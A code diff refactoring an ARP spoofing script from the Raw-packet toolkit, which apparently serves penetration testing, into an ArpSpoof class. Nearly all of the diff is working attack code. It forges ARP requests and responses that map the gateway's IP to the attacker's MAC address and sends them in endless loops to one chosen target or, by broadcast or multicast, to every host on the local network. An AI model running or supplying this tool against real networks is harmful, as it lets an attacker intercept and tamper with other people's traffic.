@@ -3,7 +3,7 @@
 
 # region Description
 """
-arp_spoof.py: ARP spoofing script
+arp_spoof.py: ARP Spoofing (arp_spoof)
 Author: Vladimir Ivanov
 License: MIT
 Copyright 2020, Raw-packet Project
@@ -12,11 +12,10 @@ Copyright 2020, Raw-packet Project
 
 # region Import
 from raw_packet.Utils.base import Base
+from raw_packet.Utils.utils import Utils
 from raw_packet.Utils.network import RawARP, RawSend
-from raw_packet.Scanners.arp_scanner import ArpScan
-from argparse import ArgumentParser
+from argparse import ArgumentParser, RawDescriptionHelpFormatter
 from time import sleep
-from prettytable import PrettyTable
 from typing import Union, List, Dict
 # endregion
 
@@ -29,6 +28,157 @@ __version__ = '0.2.1'
 __maintainer__ = 'Vladimir Ivanov'
 __email__ = 'ivanov.vladimir.mail@gmail.com'
 __status__ = 'Production'
+__script_name__ = 'ARP Spoofing (arp_spoof)'
+# endregion
+
+
+# region class NetworkConflictCreator
+class ArpSpoof:
+    
+    _base: Base = Base()
+    _utils: Utils = Utils()
+    _arp: RawARP = RawARP()
+    
+    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None}
+    _target: Dict[str, Union[None, str]] = {'ipv4-address': None, 'mac-address': None}
+
+    def __init__(self, network_interface: Union[None, str] = None) -> None:
+        self._your = self._base.get_interface_settings(interface_name=network_interface, 
+                                                       required_parameters=['mac-address', 
+                                                                            'ipv4-address',
+                                                                            'first-ipv4-address',
+                                                                            'last-ipv4-address'])
+        self._raw_send: RawSend = RawSend(network_interface=network_interface)
+
+    def start(self, 
+              gateway_ip_address: Union[None, str] = None,
+              target_ip_address: Union[None, str] = None,
+              target_mac_address: Union[None, str] = None,
+              ipv4_multicast_requests: bool = False,
+              ipv6_multicast_requests: bool = False,
+              broadcast_requests: bool = False,
+              requests: bool = False,
+              quit: bool = False) -> None:
+
+        try:
+
+            # region Set gateway IP address
+            if gateway_ip_address is None:
+                gateway_ip_address: str = self._your['ipv4-gateway']
+                assert gateway_ip_address is not None, \
+                    'Network interface: ' + self._base.error_text(self._your['network-interface']) + \
+                    ' does not have IPv4 gateway! Please set IPv4 gateway address!'
+            else:
+                assert self._base.ip_address_in_range(gateway_ip_address, 
+                                                      self._your['first-ipv4-address'], 
+                                                      self._your['last-ipv4-address']), \
+                    'Bad IPv4 gateway address: ' + self._base.error_text(gateway_ip_address) + \
+                    '; Gateway IP address must be in range: ' + \
+                    self._base.info_text(self._your['first-ipv4-address'] + ' - ' + self._your['last-ipv4-address'])
+            # endregion
+    
+            # region General output
+            if not quit:
+                self._base.print_info('Network interface: ', self._your['network-interface'])
+                self._base.print_info('Gateway IP address: ', gateway_ip_address)
+                self._base.print_info('Your IP address: ', self._your['ipv4-address'])
+                self._base.print_info('Your MAC address: ', self._your['mac-address'])
+                self._base.print_info('First ip address: ', self._your['first-ipv4-address'])
+                self._base.print_info('Last ip address: ', self._your['last-ipv4-address'])
+            # endregion
+    
+            # region ARP spoofing with IPv4/IPv6 Multicast/Broadcast ARP requests
+            if ipv4_multicast_requests or ipv6_multicast_requests or broadcast_requests:
+                if ipv4_multicast_requests:
+                    ethernet_destination_mac_address: str = '01:00:5e:00:00:01'
+                    self._base.print_info('Send ARP requests to IPv4 multicast MAC address: ',
+                                          ethernet_destination_mac_address)
+                elif ipv6_multicast_requests:
+                    ethernet_destination_mac_address: str = '33:33:00:00:00:01'
+                    self._base.print_info('Send ARP requests to IPv6 multicast MAC address: ',
+                                          ethernet_destination_mac_address)
+                else:
+                    ethernet_destination_mac_address: str = 'ff:ff:ff:ff:ff:ff'
+                    self._base.print_info('Send ARP requests to broadcast MAC address: ',
+                                          ethernet_destination_mac_address)
+    
+                self._base.print_info('Spoof ARP table in all hosts: ', gateway_ip_address,
+                                      ' -> ', self._your['mac-address'])
+                self._base.print_info('ARP spoofing is running ...')
+    
+                while True:
+                    arp_request: bytes = self._arp.make_request(
+                        ethernet_src_mac=self._your['mac-address'],
+                        ethernet_dst_mac=ethernet_destination_mac_address,
+                        sender_mac=self._your['mac-address'],
+                        sender_ip=gateway_ip_address,
+                        target_mac='00:00:00:00:00:00',
+                        target_ip=self._your['ipv4-address'])
+                    self._raw_send.send(packet=arp_request, count=5)
+                    sleep(1)
+            # endregion
+    
+            # region Set target
+            self._target = self._utils.set_ipv4_target(network_interface=self._your['network-interface'],
+                                                       target_ipv4_address=target_ip_address,
+                                                       target_mac_address=target_mac_address,
+                                                       exclude_ipv4_addresses=[gateway_ip_address])
+            
+            if not quit:
+                self._base.print_success('Target IP address: ', self._target['ipv4-address'])
+                self._base.print_success('Target MAC address: ', self._target['mac-address'])
+                if self._target['vendor'] is not None:
+                    self._base.print_success('Target vendor: ', self._target['vendor'])
+            # endregion
+    
+            # region Spoof ARP table
+            self._base.print_info('Spoof ARP table: ', gateway_ip_address + ' -> ' + self._your['mac-address'])
+    
+            # region ARP spoofing with ARP requests
+            if requests:
+                self._base.print_info('Send ARP requests to: ',
+                                      self._target['ipv4-address'] + ' (' +
+                                      self._target['mac-address'] + ')')
+                self._base.print_info('Start ARP spoofing ...')
+                while True:
+                    random_ip: str = self._base.get_random_ip_on_interface(self._your['network-interface'])
+                    arp_request: bytes = \
+                        self._arp.make_request(ethernet_src_mac=self._your['mac-address'],
+                                               ethernet_dst_mac=self._target['mac-address'],
+                                               sender_mac=self._your['mac-address'],
+                                               sender_ip=gateway_ip_address,
+                                               target_mac='00:00:00:00:00:00',
+                                               target_ip=random_ip)
+                    self._raw_send.send(arp_request)
+                    sleep(1)
+            # endregion
+    
+            # region ARP spoofing with ARP responses
+            else:
+                self._base.print_info('Send ARP responses to: ', self._target['ipv4-address'] + ' (' + self._target['mac-address'] + ')')
+                self._base.print_info('Start ARP spoofing ...')
+                arp_response: bytes = \
+                    self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
+                                            ethernet_dst_mac=self._target['mac-address'],
+                                            sender_mac=self._your['mac-address'],
+                                            sender_ip=gateway_ip_address,
+                                            target_mac=self._target['mac-address'],
+                                            target_ip=self._target['ipv4-address'])
+                while True:
+                    self._raw_send.send(arp_response)
+                    sleep(1)
+            # endregion
+
+            # endregion
+
+        except KeyboardInterrupt:
+            self._base.print_info('Exit')
+            exit(0)
+
+        except AssertionError as Error:
+            self._base.print_error(Error.args[0])
+            exit(1)
+
 # endregion
 
 
@@ -37,217 +187,53 @@ def main():
 
     # region Init Raw-packet classes
     base: Base = Base()
-    arp: RawARP = RawARP()
     # endregion
 
-    try:
-        # region Check user and platform
-        base.check_user()
-        base.check_platform(available_platforms=['Linux', 'Darwin'])
-        # endregion
+    # region Check user and platform
+    base.check_user()
+    base.check_platform(available_platforms=['Linux', 'Darwin', 'Windows'])
+    # endregion
 
-        # region Parse script arguments
-        parser: ArgumentParser = ArgumentParser(description='ARP spoofing script')
-        parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets', default=None)
-        parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)
-        parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
-        parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address', default=None)
-        parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
-        parser.add_argument('--ipv4_multicast_requests', action='store_true',
-                            help='Send only ARP IPv4 multicast requests')
-        parser.add_argument('--ipv6_multicast_requests', action='store_true',
-                            help='Send only ARP IPv6 multicast requests')
-        parser.add_argument('-R', '--broadcast_requests', action='store_true',
-                            help='Send only ARP broadcast requests')
-        parser.add_argument('-q', '--quiet', action='store_true',
-                            help='Minimal output')
-        args = parser.parse_args()
-        # endregion
+    # region Parse script arguments
+    script_description: str = \
+        base.get_banner() + '\n' + \
+        ' ' * (int((55 - len(__script_name__)) / 2)) + \
+        base.info_text(__script_name__) + '\n\n'
+    parser = ArgumentParser(description=script_description, formatter_class=RawDescriptionHelpFormatter)
+    parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets', default=None)
+    parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)
+    parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
+    parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address', default=None)
+    parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
+    parser.add_argument('--ipv4_multicast_requests', action='store_true', help='Send only ARP IPv4 multicast requests')
+    parser.add_argument('--ipv6_multicast_requests', action='store_true', help='Send only ARP IPv6 multicast requests')
+    parser.add_argument('-R', '--broadcast_requests', action='store_true', help='Send only ARP broadcast requests')
+    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
+    args = parser.parse_args()
+    # endregion
 
-        # region Print banner if argument quit is not set
-        if not args.quiet:
-            base.print_banner()
-        # endregion
+    # region Print banner if argument quit is not set
+    if not args.quiet:
+        base.print_banner()
+    # endregion
 
-        # region Get listen network interface, your IP and MAC address, first and last IP in local network
-        if args.interface is None:
-            base.print_warning('Please set a network interface for send ARP spoofing packets ...')
-        current_network_interface: str = base.network_interface_selection(args.interface)
-        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
-        your_ip_address: str = base.get_interface_ip_address(current_network_interface)
-        first_ip_address: str = base.get_first_ip_on_interface(current_network_interface)
-        last_ip_address: str = base.get_last_ip_on_interface(current_network_interface)
-        # endregion
-
-        # region Init RawSend
-        arp_scan: ArpScan = ArpScan(network_interface=current_network_interface)
-        raw_send: RawSend = RawSend(network_interface=current_network_interface)
-        # endregion
-
-        # region Set gateway IP address
-        if args.gateway_ip is None:
-            gateway_ip_address: str = base.get_interface_gateway(current_network_interface)
-        else:
-            assert base.ip_address_in_range(args.gateway_ip, first_ip_address, last_ip_address), \
-                'Bad value `-g, --gateway_ip`: ' + base.error_text(args.gateway_ip) + \
-                '; Gateway IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
-            gateway_ip_address: str = args.gateway_ip
-        base.print_info('Gateway IP address: ', gateway_ip_address)
-        # endregion
-
-        # region General output
-        if not args.quiet:
-            base.print_info('Network interface: ', current_network_interface)
-            base.print_info('Gateway IP address: ', gateway_ip_address)
-            base.print_info('Your IP address: ', your_ip_address)
-            base.print_info('Your MAC address: ', your_mac_address)
-            base.print_info('First ip address: ', first_ip_address)
-            base.print_info('Last ip address: ', last_ip_address)
-        # endregion
-
-        # region ARP spoofing with Multicast ARP requests
-        if args.ipv4_multicast_requests or args.ipv6_multicast_requests or args.broadcast_requests:
-            if args.ipv4_multicast_requests:
-                ethernet_destination_mac_address: str = '01:00:5e:00:00:01'
-                base.print_info('Send ARP requests to IPv4 multicast MAC address: ', ethernet_destination_mac_address)
-            elif args.ipv6_multicast_requests:
-                ethernet_destination_mac_address: str = '33:33:00:00:00:01'
-                base.print_info('Send ARP requests to IPv6 multicast MAC address: ', ethernet_destination_mac_address)
-            else:
-                ethernet_destination_mac_address: str = 'ff:ff:ff:ff:ff:ff'
-                base.print_info('Send ARP requests to broadcast MAC address: ', ethernet_destination_mac_address)
-
-            base.print_info('Spoof ARP table in all hosts: ', gateway_ip_address, ' -> ', your_mac_address)
-            base.print_info('ARP spoofing is running ...')
-
-            while True:
-                arp_request: bytes = arp.make_request(
-                    ethernet_src_mac=your_mac_address,
-                    ethernet_dst_mac=ethernet_destination_mac_address,
-                    sender_mac=your_mac_address,
-                    sender_ip=gateway_ip_address,
-                    target_mac='00:00:00:00:00:00',
-                    target_ip=your_ip_address)
-                raw_send.send(packet=arp_request, count=5)
-                sleep(1)
-        # endregion
-
-        # region Set target
-        target_vendor: Union[None, str] = None
-
-        # region Target IP address is not set
-        if args.target_ip is None:
-            base.print_info('Start ARP scan ...')
-            results: List[Dict[str, str]] = arp_scan.scan(timeout=3, retry=3,
-                                                          target_ip_address=None, check_vendor=True,
-                                                          exclude_ip_addresses=[gateway_ip_address],
-                                                          exit_on_failure=True,
-                                                          show_scan_percentage=True)
-            if len(results) == 1:
-                target_ip_address: str = results[0]['ip-address']
-                target_mac_address: str = results[0]['mac-address']
-            else:
-                base.print_success('Found ', str(len(results)),
-                                   ' alive hosts on interface: ', current_network_interface)
-                hosts_pretty_table: PrettyTable = PrettyTable([base.cINFO + 'Index' + base.cEND,
-                                                               base.cINFO + 'IP address' + base.cEND,
-                                                               base.cINFO + 'MAC address' + base.cEND,
-                                                               base.cINFO + 'Vendor' + base.cEND])
-                device_index: int = 1
-                for device in results:
-                    hosts_pretty_table.add_row([str(device_index), device['ip-address'],
-                                                device['mac-address'], device['vendor']])
-                    device_index += 1
-
-                print(hosts_pretty_table)
-                device_index -= 1
-                current_device_index = input(base.c_info + 'Set device index from range (1-' +
-                                             str(device_index) + '): ')
-
-                if not current_device_index.isdigit():
-                    base.print_error('Your input data: ' + str(current_device_index) + ' is not digit!')
-                    exit(1)
-
-                if any([int(current_device_index) < 1, int(current_device_index) > device_index]):
-                    base.print_error('Your number is not within range (1-' + str(device_index) + ')')
-                    exit(1)
-
-                current_device_index = int(current_device_index) - 1
-                device: Dict[str, str] = results[current_device_index]
-                target_ip_address: str = device['ip-address']
-                target_mac_address: str = device['mac-address']
-                if device['vendor'] is not None and device['vendor'] != '':
-                    target_vendor: str = device['vendor']
-        # endregion
-
-        # region Target IP address is set
-        else:
-            assert base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address), \
-                'Bad value `-t, --target_ip`: ' + base.error_text(args.target_ip) + \
-                '; Target IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
-            target_ip_address: str = args.target_ip
-            if args.target_mac is not None:
-                assert base.mac_address_validation(args.target_mac), \
-                    'Bad MAC address `-m, --target_mac`: ' + base.error_text(args.target_mac) + \
-                    '; example MAC address: ' + base.info_text('12:34:56:78:90:ab')
-                target_mac_address: str = args.target_mac
-            else:
-                base.print_info('Get MAC address of IP: ', target_ip_address)
-                target_mac_address: str = arp_scan.get_mac_address(target_ip_address=target_ip_address,
-                                                                   timeout=3, retry=3,
-                                                                   exit_on_failure=True,
-                                                                   show_scan_percentage=False)
-        # endregion
-
-        base.print_success('Target IP address: ', target_ip_address)
-        base.print_success('Target MAC address: ', target_mac_address)
-        if target_vendor is not None:
-            base.print_success('Target vendor: ', target_vendor)
-        # endregion
-
-        # region Spoof ARP table
-        base.print_info('Spoof ARP table: ', gateway_ip_address + ' -> ' + your_mac_address)
-
-        # region ARP spoofing with ARP requests
-        if args.requests:
-            base.print_info('Send ARP requests to: ', target_ip_address + ' (' + target_mac_address + ')')
-            base.print_info('Start ARP spoofing ...')
-            while True:
-                arp_request: bytes = arp.make_request(ethernet_src_mac=your_mac_address,
-                                                      ethernet_dst_mac=target_mac_address,
-                                                      sender_mac=your_mac_address,
-                                                      sender_ip=gateway_ip_address,
-                                                      target_mac='00:00:00:00:00:00',
-                                                      target_ip=base.get_random_ip_on_interface(
-                                                          current_network_interface))
-                raw_send.send(arp_request)
-                sleep(1)
-        # endregion
-
-        # region ARP spoofing with ARP responses
-        else:
-            base.print_info('Send ARP responses to: ', target_ip_address + ' (' + target_mac_address + ')')
-            base.print_info('Start ARP spoofing ...')
-            arp_response: bytes = arp.make_response(ethernet_src_mac=your_mac_address,
-                                                    ethernet_dst_mac=target_mac_address,
-                                                    sender_mac=your_mac_address,
-                                                    sender_ip=gateway_ip_address,
-                                                    target_mac=target_mac_address,
-                                                    target_ip=target_ip_address)
-            while True:
-                raw_send.send(arp_response)
-                sleep(1)
-        # endregion
-
-        # endregion
-
-    except KeyboardInterrupt:
-        base.print_info('Exit')
-        exit(0)
-
-    except AssertionError as Error:
-        base.print_error(Error.args[0])
-        exit(1)
+    # region Get listen network interface, your IP and MAC address, first and last IP in local network
+    if args.interface is None:
+        base.print_warning('Please set a network interface for send ARP spoofing packets ...')
+    current_network_interface: str = base.network_interface_selection(args.interface)
+    # endregion
+    
+    # region Start Arp Spoof
+    arp_spoof: ArpSpoof = ArpSpoof(network_interface=current_network_interface)
+    arp_spoof.start(gateway_ip_address=args.gateway_ip,
+                    target_ip_address=args.target_ip,
+                    target_mac_address=args.target_mac,
+                    ipv4_multicast_requests=args.ipv4_multicast_requests,
+                    ipv6_multicast_requests=args.ipv6_multicast_requests,
+                    broadcast_requests=args.broadcast_requests,
+                    requests=args.requests,
+                    quit=args.quiet)
+    # endregion
 
 # endregion
 
